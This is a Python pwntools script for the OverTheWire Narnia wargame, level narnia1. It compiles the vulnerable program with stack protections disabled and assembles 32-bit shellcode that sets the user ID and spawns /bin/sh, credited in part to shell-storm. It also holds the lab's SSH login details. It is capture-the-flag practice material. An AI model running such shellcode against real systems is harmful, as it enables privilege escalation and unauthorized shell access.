#!/usr/bin/env python
from pwn import *
import os

# Define the context of the working machine
context(arch='i386', os='linux')

# # Download the i386 binary
# s = ssh(user='narnia1', host='narnia.labs.overthewire.org', password='efeidiedae', port=2226)
# s.download("/narnia/narnia1")

# Compile the binary
log.info("Compiling the binary narnia1_local")
# os.system('gcc narnia1.c -g -o narnia1_local -fno-stack-protector -z execstack')
os.system('gcc narnia1.c -g -m32 -o narnia1_local -fno-stack-protector -z execstack')

# Get a simple shellcode
log.info("Putting together simple shellcode")
shellcode = shellcraft.sh()
shellcode_asm = asm(shellcode)
# print(shellcode)
# print(shellcode_asm)

# setreuid(geteuid(),geteuid()),execve("/bin/sh",0,0) 34byte universal shellcode, 32 bits
#   Fetched from http://shell-storm.org/shellcode/files/shellcode-399.php
sh_shellcode = """
        push $0x31
        pop %eax
        cltd
        int $0x80
        mov %eax, %ebx
        mov %eax, %ecx
        push $0x46
        pop %eax
        int $0x80
        mov $0xb, %al
        push %edx
        push $0x68732f6e
        push $0x69622f2f
        mov %esp, %ebx
        mov %edx, %ecx
        int $0x80
"""
sh_shellcode2 = """
        /* execve(path='/bin///sh', argv=['sh'], envp=0) */
        /* push '/bin///sh\x00' */
        push 0x68
        push 0x732f2f2f
        push 0x6e69622f
        mov ebx, esp
        /* push argument array ['sh\x00'] */
        /* push 'sh\x00\x00' */
        push 0x1010101
        xor dword ptr [esp], 0x1016972
        xor ecx, ecx
        push ecx /* null terminate */
        push 4
        pop ecx
        add ecx, esp
        push ecx /* 'sh\x00' */
        mov ecx, esp
        xor edx, edx
        /* call execve() */
        push SYS_execve /* 0xb */
        pop eax
        int 0x80
"""

# Create a binary out of some shellcode
# e = ELF.from_assembly(shellcode, vma=0x400000, arch='i386')
# e = ELF.from_assembly(sh_shellcode, vma=0x400000, arch='i386')
e = ELF.from_assembly(sh_shellcode2, vma=0x400000, arch='i386')

#
# log.info("Introduce shellcode in EGG env. variable")
# os.environ["EGG"] = shellcode
#
# log.info("Launching narnia1_local")
# # binary = ELF('narnia1_local', checksec=False)
# sh = process('narnia1_local')
# sh.interactive()
